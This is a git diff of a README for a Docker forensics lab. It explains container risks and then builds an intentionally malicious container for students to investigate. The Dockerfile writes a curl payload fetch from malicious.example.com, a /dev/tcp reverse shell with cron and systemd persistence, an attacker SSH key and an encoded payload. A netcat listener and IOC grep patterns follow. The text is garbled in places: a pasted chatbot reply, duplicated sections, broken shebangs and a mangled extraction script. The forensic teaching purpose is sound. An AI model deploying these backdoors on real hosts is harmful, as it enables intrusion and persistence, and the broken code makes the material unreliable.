@@ -1,257 +1,542 @@
-Docker complete forensic analysis (end-to-end)
+# 🐳 Docker Complete Forensic Analysis (End-to-End)
 
- What is Docker?
+## 📦 What is Docker?
 
-Docker is an open-source platform that enables you to automate the deployment, scaling, and management of applications using containerization.
-
----
-
- Why Use Docker?
-
- Consistency across environments (dev, test, prod)
- Faster development cycles
- Lightweight and portable containers
- Microservices architecture support
+Docker is an open-source platform that automates application deployment, scaling, and management using containerization. It allows software to run reliably across different computing environments.
 
 ---
 
- Key Concepts & Technical Terms
+## 🚀 Why Use Docker?
 
-| Term              | Description                                                                                              |
-| ----------------- | -------------------------------------------------------------------------------------------------------- |
-| Container    		| A lightweight, standalone executable package that includes everything needed to run a piece of software. |
-| Image         	| A read-only template used to create containers. this contains app code,libraries, interpreters, etc.	   |
-| Dockerfile    	| A script containing a series of instructions used to build a Docker image.                               |
-| Docker Hub    	| A cloud-based registry where Docker users can share images.                                              |
-| Docker Engine 	| The runtime that builds and runs Docker containers.                                                      |
-| Volume        	| A persistent storage mechanism used by containers.                                                       |
-| Bind Mount    	| A specific file or directory on the host is mounted into the container.                                  |
-| Network       	| A virtual network to allow communication between Docker containers.                                      |
-| Registry      	| A place where Docker images are stored and distributed (e.g., Docker Hub, private registry).             |
-| Port Binding  	| Maps container ports to host machine ports.                                                              |
+- Consistency across dev, test, and production environments  
+- Faster development and deployment cycles  
+- Lightweight and portable containers  
+- Supports microservices architecture
 
 ---
 
- Docker Architecture
+## 📘 Key Concepts & Technical Terms
 
-'''
+| Term            | Description |
+|-----------------|-------------|
+| **Container**   | A standalone package with everything needed to run an app |
+| **Image**       | Read-only template used to create containers |
+| **Dockerfile**  | Instructions to build a Docker image |
+| **Docker Hub**  | Cloud-based registry to share Docker images |
+| **Volume**      | Persistent storage for containers |
+| **Bind Mount**  | Mounts host files/directories inside containers |
+| **Network**     | Virtual network connecting Docker containers |
+| **Port Binding**| Maps container ports to host ports |
+| **Registry**    | Stores and distributes Docker images |
+
+---
+
+## 🧱 Docker Architecture
+
 +-------------------------+
-|     Docker Client       |
+| Docker Client |
 +-----------+-------------+
-            |
-            v
+|
++-----------v-------------+
+| Docker Daemon |
 +-----------+-------------+
-|     Docker Daemon       |
-+-----------+-------------+
-            |
-            v
-+-----------+-------------+
+|
++-----------v-------------+
 | Docker Objects (Images, |
-| Containers, Volumes,    |
-| Networks)               |
+| Containers, Volumes, |
+| Networks) |
 +-------------------------+
-'''
 
 ---
 
- Basic Docker Workflow
+## 🔄 Basic Docker Workflow
 
-1. Write a Dockerfile
-2. Build an image from Dockerfile
-3. Run a container from the image
-4. Push the image to a registry (optional)
-5. Deploy the container on other machines
-
----
-
- Common Use Cases
-
- Developing microservices
- Running databases locally
- Automating CI/CD pipelines
- Isolated testing environments
-
-----------------------------------------
-
-Docker Components
-  Client
-
-| Component      | Explanation                                   |
-| -------------- | --------------------------------------------- |
-| 'docker build' | Builds a Docker image from a Dockerfile.      |
-| 'docker push'  | Uploads a local image to a Docker registry.   |
-| 'docker run'   | Creates and starts a container from an image. |
+1. Write a "Dockerfile"
+2. Build image from Dockerfile
+3. Run container from image
+4. Push image to registry (optional)
+5. Deploy container on target system
 
 ---
 
-  Host
+## 🔧 Docker Components
 
-| Component      | Explanation                                                                        |
-| -------------- | ---------------------------------------------------------------------------------- |
-| Daemons    	 | The Docker Engine (daemon) runs in the background to manage containers and images. |
-| Containers     | Running instances of Docker images that encapsulate applications and dependencies. |
-| Images         | Read-only templates with instructions to create containers.                        |
+# 🖥️ Client
+
+| Command         | Description |
+|-----------------|-------------|
+| "docker build"  | Build Docker image from a Dockerfile |
+| "docker push"   | Push image to Docker registry |
+| "docker run"    | Start container from image |
+
+# 💽 Host
+
+| Component  | Explanation |
+|------------|-------------|
+| **Daemon** | Docker Engine managing containers/images |
+| **Images** | Read-only instructions to build containers |
+| **Containers** | Running instances of images |
+
+# 🌐 Registry
+
+| Component   | Explanation |
+|-------------|-------------|
+| **Repo**    | Group of related Docker images |
+| **Notary**  | Image signing for trust verification |
 
 ---
 
-  Registry
+## 🆚 Docker vs VMware: Key Differences
 
-| Component        | Explanation                                                     |
-| ---------------- | --------------------------------------------------------------- |
-| Repositories 	   | Collections of related Docker images (often tagged by version). |
-| Notary           | Provides image signing and verification for trusted content.    |
-
-----------------------------------------------------------
-
-Difference between Docker (container) && VMWare (Hypervisor)
-
-Here's a clear comparison of Docker (Containerization) vs VMware (Hypervisor/Virtualization):
+| Feature           | Docker (Containers)        | VMware (VMs)               |
+|-------------------|----------------------------|----------------------------|
+| Type              | OS-level virtualization     | Hardware-level virtualization |
+| Boot Time         | Seconds                     | Minutes                    |
+| Resource Usage    | Lightweight                 | Heavy (includes full OS)  |
+| OS Dependency     | Same OS family              | Different OS possible      |
+| Performance       | Near-native                 | Slightly reduced           |
+| Portability       | Highly portable             | Less portable              |
+| Use Case          | Microservices, CI/CD        | Legacy apps, multi-OS testing |
+| Image Format      | Docker Image                | VMDK, VHD                  |
 
 ---
 
-Docker vs VMware: Key Differences
+## 🔐 Why Forensics in Docker?
 
-| Feature             | Docker (Containerization)                              	    | VMware (Hypervisor/Virtualization)                             |
-| ------------------- | ----------------------------------------------------------- | -------------------------------------------------------------- |
-| Technology Type 	  | OS-level virtualization                                     | Hardware-level virtualization                                  |
-| Isolation Level 	  | Process-level isolation (shares host OS kernel)             | Full OS isolation (each VM runs its own OS)                    |
-| Boot Time       	  | Very fast (seconds)                                         | Slower (minutes)                                               |
-| Resource Usage  	  | Lightweight (uses less RAM and CPU)                         | Heavy (each VM needs OS + app resources)                       |
-| OS Dependency   	  | Containers must use the same OS family as host              | VMs can run completely different OSes (e.g., Linux on Windows) |
-| Performance     	  | Near-native performance due to lack of full OS overhead     | Slightly reduced due to full OS emulation                      |
-| Portability     	  | Highly portable across platforms (write once, run anywhere) | Less portable due to OS/hardware dependencies                  |
-| Use Case        	  | Ideal for microservices, CI/CD, cloud-native apps           | Ideal for legacy apps, full OS testing, running multiple OSes  |
-| Example Tool    	  | Docker                                                      | VMware Workstation, vSphere, ESXi                              |
-| Image Format    	  | Docker Image                                                | VM Disk Image (e.g., VMDK)                                     |
+# Minimal Visibility
 
-Summary:
+- Containers may evade traditional host-level monitoring.
+- Temporary containers can erase forensic traces on shutdown.
 
- Docker is best for fast, scalable, lightweight application deployment using containers.
- VMware is best for running multiple operating systems with stronger isolation using virtual machines.
+# Container Breakouts
 
------------------------------------------------------------------
-Why forensics in Docker?
+- **CVE-2016-5195 (Dirty COW)** – Kernel privilege escalation  
+- **CVE-2017-5123** – Memory corruption, container escape  
+- **CVE-2014-9357** – Docker CLI command injection  
 
- 1. Minimal Visibility
-	What It Means:
-	Containers are lightweight and fast, but they don’t provide the same visibility as full VMs. Traditional monitoring and security tools may not see inside containers unless specifically designed for it.
+# Persistence & Lateral Movement
 
-	 Why It's Dangerous:
-	Processes inside containers can run unnoticed by host-level tools.
+- Use of Docker socket ("/var/run/docker.sock")
+- Shared networks and volumes to pivot or extract secrets
 
-	If logs are not externalized, malicious activity may vanish once a container is destroyed.
+# Source Poisoning & Supply Chain Attacks
 
-	 Example:
-	An attacker exploits a web app inside a container. Since the container lacks audit logging and runs in a temporary state, the entire attack leaves no forensic trail after the container stops.
+- Malicious Docker images on public registries  
+- E.g., "ubuntu-nginx", "alpine-python" with embedded cryptominers  
 
- 2. Container Breakouts
-	These are vulnerabilities that allow an attacker to escape a container and gain access to the host OS — a major breach of the Docker security model.
+# Credential Leaks in Public Repos
 
-	 Notable CVEs:
-	 CVE-2016-5195 (Dirty COW)
-	Exploit: Privilege escalation vulnerability in the Linux kernel.
-	Impact: A user in a container could write to read-only memory and gain root access on the host.
+- ".env", SSH keys, config files often included in Docker images
+- Misconfigured ".dockerignore" leads to sensitive info exposure
 
-	 CVE-2017-5123
-	Exploit: Linux kernel vulnerability (memory management issue).
-	Impact: Enabled container escape and root privilege escalation.
+---
 
-	 CVE-2014-9357
-	Exploit: Docker command-line injection vulnerability via crafted image paths.
+## 📊 Case Studies
 
-	Impact: Could lead to arbitrary code execution on the host.
+# 1. RWTH Aachen University Study (2023)
+- 8.5% of 337,171 Docker images leaked secrets (API keys, SSH keys)
+- [📄 Link](https://arxiv.org/abs/2307.03958)
 
-	 Real-World Consequence:
-	An attacker who escapes a container can access host system resources, other containers, secrets, or even take over the entire node in a Kubernetes cluster.
+# 2. Sysdig Threat Research (2022)
+- 250k+ images with hardcoded secrets and cryptominers
+- [📄 Link](https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)
 
- 3. Leverage for Persistence & Lateral Movement
-	 What It Means:
-	Once inside a container or host, attackers often plant backdoors or malicious containers to maintain persistence or move laterally across systems.
+# 3. BleepingComputer Report (2022)
+- Over 1,600 malicious Docker Hub images found
+- [📄 Link](https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/)
 
-	 How Attackers Do It:
-	Deploy a new container that communicates with a C2 server.
+---
 
-	Use Docker socket (/var/run/docker.sock) to control other containers.
+## 🧪 Docker Lab Setup
 
-	Exploit shared networks or volumes to access secrets from other containers.
+# Dockerfile (Malicious Container)
 
-	 Example:
-	If an attacker compromises a Jenkins container, they could:
+"Dockerfile
+FROM ubuntu:20.04
 
-	Modify the Jenkins build pipeline to deploy a reverse shell
+RUN apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
+    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
+    mkdir -p /home/attacker && chown attacker:attacker /home/attacker
 
-	Use credentials stored in the container to access the Git repo or production DB
+# Malware & reverse shell
+RUN echo '#!/bin/\necho "Stealing data..."\ncurl http://malicious.example.com/payload.sh' > /home/attacker/malware.sh && chmod +x /home/attacker/malware.sh
+RUN echo '#!/bin/\n -i >& /dev/tcp/192.168.44.129/4444 0>&1' > /home/attacker/revshell.sh && chmod +x /home/attacker/revshell.sh
 
-	Pivot to other containers using the shared Docker network
+# Simulated history
+RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/._history
 
- 4. Source Poisoning & Supply Chain Attacks
-	 What It Means:
-	Attackers inject malware into public Docker images or dependencies, which are then unknowingly pulled and used by developers.
+# Persistence
+RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && chmod 600 /var/spool/cron/crontabs/attacker
 
-	 Example: Malicious Docker Images
-	In 2021, over 30 malicious Docker images with cryptominers were downloaded over 20 million times.
+# Backdoor service
+RUN mkdir -p /etc/systemd/system && \
+    echo -e "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
 
-	Images appeared to be legit (e.g., ubuntu-nginx, alpine-python) but contained malicious scripts.
+# SSH Key
+RUN mkdir -p /home/attacker/.ssh && echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
+    chmod 600 /home/attacker/.ssh/authorized_keys && chown -R attacker:attacker /home/attacker/.ssh
 
-	 Supply Chain Attack:
-	Compromising a base image (e.g., node:14) or upstream dependency like npm package
+# Encoded Payload
+RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64
 
-Example: SolarWinds breach, though not Docker-specific, highlighted how dangerous trusted dependency attacks can be
-
- 5. Vulnerabilities as Users and Providers
-	 Users:
-	Misconfigured Dockerfiles (e.g., FROM root, exposing ports)
-
-	Using --privileged flag or mapping Docker socket inside containers
-
-	 Providers:
-	Cloud vendors hosting insecure registries
-
-	Official images with outdated libraries (e.g., OpenSSL, glibc vulnerabilities)
-
-	 Real-World:
-	A cloud-based CI/CD pipeline might run Docker with elevated privileges. If the CI runner is compromised, all containers and secrets in the pipeline could be exposed.
-
- 6. IP, Credential & Data Leaks in Public Repos
-	 What It Means:
-	Sensitive data often ends up in Docker images and gets pushed to public registries like Docker Hub — unintentionally.
-
-	 Common Mistakes:
-	Hardcoded credentials in ENV or RUN commands
-
-	.env, SSH keys, or config files left in build context
-
-	.dockerignore not properly configured
-
-		Case-studies
-		
-		1. RWTH Aachen University Study (2023)
-
-			Summary: Researchers analyzed 337,171 Docker images and identified that 8.5% contained sensitive data, including 52,107 valid private keys and 3,158 distinct API secrets. Notably, 95% of the exposed private keys and 90% of API secrets were found in single-user images, indicating unintentional leaks.
-
-			Key Findings:
-				Exposed keys were actively used, compromising over 275,000 TLS and SSH hosts.
-				22,082 compromised certificates relied on these keys, with 61% being self-signed.
-			https://arxiv.org/abs/2307.03958
-			
-			
-		2. Sysdig Threat Research Team Analysis (2022)
-
-			Summary: Sysdig's analysis of over 250,000 Linux images on Docker Hub revealed that many contained embedded secrets, such as API keys and SSH keys, which could be exploited by attackers.
-
-			Key Findings:
-				Malicious images often disguised themselves as legitimate software through typosquatting.
-				Some images contained cryptocurrency miners and other malicious payloads.
-				
-			https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/
-			
-		3. BleepingComputer Report (2022)
-
-			Summary: An investigation uncovered over 1,600 publicly available Docker Hub images that hid malicious behavior, including cryptocurrency miners and embedded secrets that could serve as backdoors.
-
-			Key Findings:
-				Attackers leveraged these images to compromise systems by embedding malicious code and secrets.
-		
-		https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/
+WORKDIR /home/attacker
+USER attacker
+CMD ["/home/attacker/revshell.sh"]
 
 
+Sure! Here's a **clean, well-structured, and comprehensive "README.md"** file that combines both the Docker lab setup and forensic investigation steps into a single, professionally formatted document.
+
+---
+
+"markdown
+# 🐳 Docker Complete Forensic Analysis (End-to-End)
+
+## 📦 What is Docker?
+
+Docker is an open-source platform that automates application deployment, scaling, and management using containerization. It allows software to run reliably across different computing environments.
+
+---
+
+## 🚀 Why Use Docker?
+
+- Consistency across dev, test, and production environments  
+- Faster development and deployment cycles  
+- Lightweight and portable containers  
+- Supports microservices architecture
+
+---
+
+## 📘 Key Concepts & Technical Terms
+
+| Term            | Description |
+|-----------------|-------------|
+| **Container**   | A standalone package with everything needed to run an app |
+| **Image**       | Read-only template used to create containers |
+| **Dockerfile**  | Instructions to build a Docker image |
+| **Docker Hub**  | Cloud-based registry to share Docker images |
+| **Volume**      | Persistent storage for containers |
+| **Bind Mount**  | Mounts host files/directories inside containers |
+| **Network**     | Virtual network connecting Docker containers |
+| **Port Binding**| Maps container ports to host ports |
+| **Registry**    | Stores and distributes Docker images |
+
+---
+
+## 🧱 Docker Architecture
+
+"
+
++-------------------------+
+\|     Docker Client       |
++-----------+-------------+
+|
++-----------v-------------+
+\|     Docker Daemon       |
++-----------+-------------+
+|
++-----------v-------------+
+\| Docker Objects (Images, |
+\| Containers, Volumes,    |
+\| Networks)               |
++-------------------------+
+
+
+
+---
+
+## 🔄 Basic Docker Workflow
+
+1. Write a "Dockerfile"
+2. Build image from Dockerfile
+3. Run container from image
+4. Push image to registry (optional)
+5. Deploy container on target system
+
+---
+
+## 🔧 Docker Components
+
+# 🖥️ Client
+
+| Command         | Description |
+|-----------------|-------------|
+| "docker build"  | Build Docker image from a Dockerfile |
+| "docker push"   | Push image to Docker registry |
+| "docker run"    | Start container from image |
+
+# 💽 Host
+
+| Component  | Explanation |
+|------------|-------------|
+| **Daemon** | Docker Engine managing containers/images |
+| **Images** | Read-only instructions to build containers |
+| **Containers** | Running instances of images |
+
+# 🌐 Registry
+
+| Component   | Explanation |
+|-------------|-------------|
+| **Repo**    | Group of related Docker images |
+| **Notary**  | Image signing for trust verification |
+
+---
+
+## 🆚 Docker vs VMware: Key Differences
+
+| Feature           | Docker (Containers)        | VMware (VMs)               |
+|-------------------|----------------------------|----------------------------|
+| Type              | OS-level virtualization     | Hardware-level virtualization |
+| Boot Time         | Seconds                     | Minutes                    |
+| Resource Usage    | Lightweight                 | Heavy (includes full OS)  |
+| OS Dependency     | Same OS family              | Different OS possible      |
+| Performance       | Near-native                 | Slightly reduced           |
+| Portability       | Highly portable             | Less portable              |
+| Use Case          | Microservices, CI/CD        | Legacy apps, multi-OS testing |
+| Image Format      | Docker Image                | VMDK, VHD                  |
+
+---
+
+## 🔐 Why Forensics in Docker?
+
+# Minimal Visibility
+
+- Containers may evade traditional host-level monitoring.
+- Temporary containers can erase forensic traces on shutdown.
+
+# Container Breakouts
+
+- **CVE-2016-5195 (Dirty COW)** – Kernel privilege escalation  
+- **CVE-2017-5123** – Memory corruption, container escape  
+- **CVE-2014-9357** – Docker CLI command injection  
+
+# Persistence & Lateral Movement
+
+- Use of Docker socket ("/var/run/docker.sock")
+- Shared networks and volumes to pivot or extract secrets
+
+# Source Poisoning & Supply Chain Attacks
+
+- Malicious Docker images on public registries  
+- E.g., "ubuntu-nginx", "alpine-python" with embedded cryptominers  
+
+# Credential Leaks in Public Repos
+
+- ".env", SSH keys, config files often included in Docker images
+- Misconfigured ".dockerignore" leads to sensitive info exposure
+
+---
+
+## 📊 Case Studies
+
+# 1. RWTH Aachen University Study (2023)
+- 8.5% of 337,171 Docker images leaked secrets (API keys, SSH keys)
+- [📄 Link](https://arxiv.org/abs/2307.03958)
+
+# 2. Sysdig Threat Research (2022)
+- 250k+ images with hardcoded secrets and cryptominers
+- [📄 Link](https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)
+
+# 3. BleepingComputer Report (2022)
+- Over 1,600 malicious Docker Hub images found
+- [📄 Link](https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/)
+
+---
+
+## 🧪 Docker Lab Setup
+
+# Dockerfile (Malicious Container)
+
+"Dockerfile
+FROM ubuntu:20.04
+
+RUN apt-get update && \
+    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
+    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
+    mkdir -p /home/attacker && chown attacker:attacker /home/attacker
+
+# Malware & reverse shell
+RUN echo '#!/bin/\necho "Stealing data..."\ncurl http://malicious.example.com/payload.sh' > /home/attacker/malware.sh && chmod +x /home/attacker/malware.sh
+RUN echo '#!/bin/\n -i >& /dev/tcp/192.168.44.129/4444 0>&1' > /home/attacker/revshell.sh && chmod +x /home/attacker/revshell.sh
+
+# Simulated history
+RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/._history
+
+# Persistence
+RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && chmod 600 /var/spool/cron/crontabs/attacker
+
+# Backdoor service
+RUN mkdir -p /etc/systemd/system && \
+    echo -e "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+
+# SSH Key
+RUN mkdir -p /home/attacker/.ssh && echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
+    chmod 600 /home/attacker/.ssh/authorized_keys && chown -R attacker:attacker /home/attacker/.ssh
+
+# Encoded Payload
+RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64
+
+WORKDIR /home/attacker
+USER attacker
+CMD ["/home/attacker/revshell.sh"]
+
+
+---
+
+## 🛠️ Lab Execution
+
+# Build Image:
+
+"
+sudo docker build -t attacker-lab .
+"
+
+# Start Reverse Shell Listener:
+
+"
+nc -lvnp 4444
+"
+
+# Run Container:
+
+"
+sudo docker run --name attacker-lab1 -it attacker-lab
+"
+
+# Stop & Remove All Containers:
+
+"
+sudo docker rm -f $(sudo docker ps -aq)
+"
+
+---
+
+## 📌 Useful Docker Commands (Cheat Sheet)
+
+# Basic Info
+
+"
+docker version
+docker info
+docker ps -a
+docker images
+"
+
+# Inspect & Logs
+
+"
+docker inspect attacker-lab
+docker logs attacker-lab
+docker diff attacker-lab
+docker history attacker-lab --no-trunc
+docker exec -it attacker-lab1 /bin/
+"
+
+---
+
+## 🕵️‍♂️ Forensic Analysis
+
+# 📁 Export & Inspect Image
+
+"
+docker save attacker-lab > attacker-manifest.tar
+mkdir attacker-manifest && tar -xvf attacker-manifest.tar -C attacker-manifest/
+cat attacker-manifest/manifest.json
+"
+
+## 🔍 Extract Layers Script
+
+"
+#!/bin/
+OCI_DIR="attacker-manifest"
+LAYER_DIR="layers"
+mkdir -p "$LAYER_DIR" && cd "$OCI_DIR"
+layer_digests=$(jq -r '.[0].Layers[]' manifest.json)
+layer_num=1
+
+for digest in $layer_digests; do
+  clean_digest=$(basename "$digest")
+  tarball="blobs/sha256/$clean_digest"
+  out_dir="../$LAYER_DIR/layer$layer_num"
+  mkdir -p "$out_dir"
+  tar -xf "$tarball" -C "$out_dir"
+  ((layer_num++))
+done
+
+echo "[*] IOC scan in progress..."
+for d in ../$LAYER_DIR/*; do
+  find "$d" -
+"
+
+
+type f $-name "*cron*" -o -name "*_history*" -o -name "*.sh" -o -name "*.service"$
+grep -rE "nc -e| -i|curl|wget|/dev/tcp" "\$d" 2>/dev/null
+done
+
+
+
+---
+
+# 🗂️ Export Container Filesystem
+
+"
+docker export attacker-lab1 > attacker-lab.tar
+mkdir extracted_lab && tar -xf attacker-lab.tar -C extracted_lab
+
+
+# Analyze Key Files
+
+"
+cat extracted_lab/home/attacker/._history
+cat extracted_lab/home/attacker/malware.sh
+cat extracted_lab/home/attacker/revshell.sh
+base64 -d extracted_lab/home/attacker/encoded_payload.b64
+cat extracted_lab/var/spool/cron/crontabs/attacker
+cat extracted_lab/etc/systemd/system/backdoor.service
+cat extracted_lab/home/attacker/.ssh/authorized_keys
+"
+
+---
+
+## 🧠 Memory Dump & Analysis
+
+# Get PID:
+
+"
+docker inspect --format '{{.State.Pid}}' attacker-lab
+"
+
+# Dump Memory:
+
+"
+sudo gcore -o memdump <PID>
+"
+
+# Analyze with Radare2:
+
+"
+sudo radare2 -q -c 'iI; iz; afl' memdump.<PID>
+"
+
+---
+
+## 🧠 Network Capture (Optional)
+
+# Capture Reverse Shell Traffic:
+
+"
+sudo tcpdump -i any port 4444 -w revshell.pcap
+wireshark revshell.pcap
+"
+
+---
+
+## ✅ Summary
+
+This repository demonstrates:
+
+* How attackers can abuse Docker for persistence, lateral movement, and data exfiltration
+* How forensic analysts can extract, analyze, and detect these behaviors using Docker tools,  scripting, and memory/network inspection
+  
+---
+*🔐 Always use secure base images, scan for vulnerabilities, externalize logs, and avoid exposing the Docker socket in production.*
